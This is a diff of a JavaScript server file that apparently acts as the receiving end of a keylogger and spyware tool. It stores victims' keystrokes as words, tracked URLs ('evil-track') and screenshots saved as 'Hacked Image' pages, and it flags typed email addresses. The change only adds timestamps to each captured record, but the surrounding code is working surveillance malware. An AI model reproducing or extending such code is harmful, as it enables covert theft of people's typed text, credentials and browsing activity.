@@ -43,16 +43,24 @@ https
 
         const jsonBody = getBodyJson(strBody);
         if (jsonBody.type === "evil-track") {
-          content.push({ type: "url", content: jsonBody.url });
+          content.push({
+            date: new Date(),
+            type: "url",
+            content: jsonBody.url,
+          });
         }
         if (jsonBody.type === "report-site") {
-          content.push({ type: "reportedSite", content: jsonBody.url });
+          content.push({
+            date: new Date(),
+            type: "reportedSite",
+            content: jsonBody.url,
+          });
         }
         if (jsonBody.type === "key") {
           const letter = jsonBody.key;
           word += letter;
           if (letter === " " || letter === "Enter" || letter === "Tab") {
-            content.push({ type: "word", content: word });
+            content.push({ date: new Date(), type: "word", content: word });
             if (word.indexOf("@") > -1) {
               console.warn("🎺 email found: " + word + " 🎺");
             }
@@ -65,7 +73,11 @@ https
           const htmlWithImage = `<html><body><h1>Hacked Image - ${new Date().toDateString()}</h1><img src="${
             jsonBody.content
           }" /></body></html>`;
-          content.push({ type: "screenshot", content: jsonBody.content });
+          content.push({
+            date: new Date(),
+            type: "screenshot",
+            content: jsonBody.content,
+          });
           fs.writeFile(imageName, htmlWithImage, function (err) {
             if (err) throw err;
             console.log("=== Image saved: ", imageName);
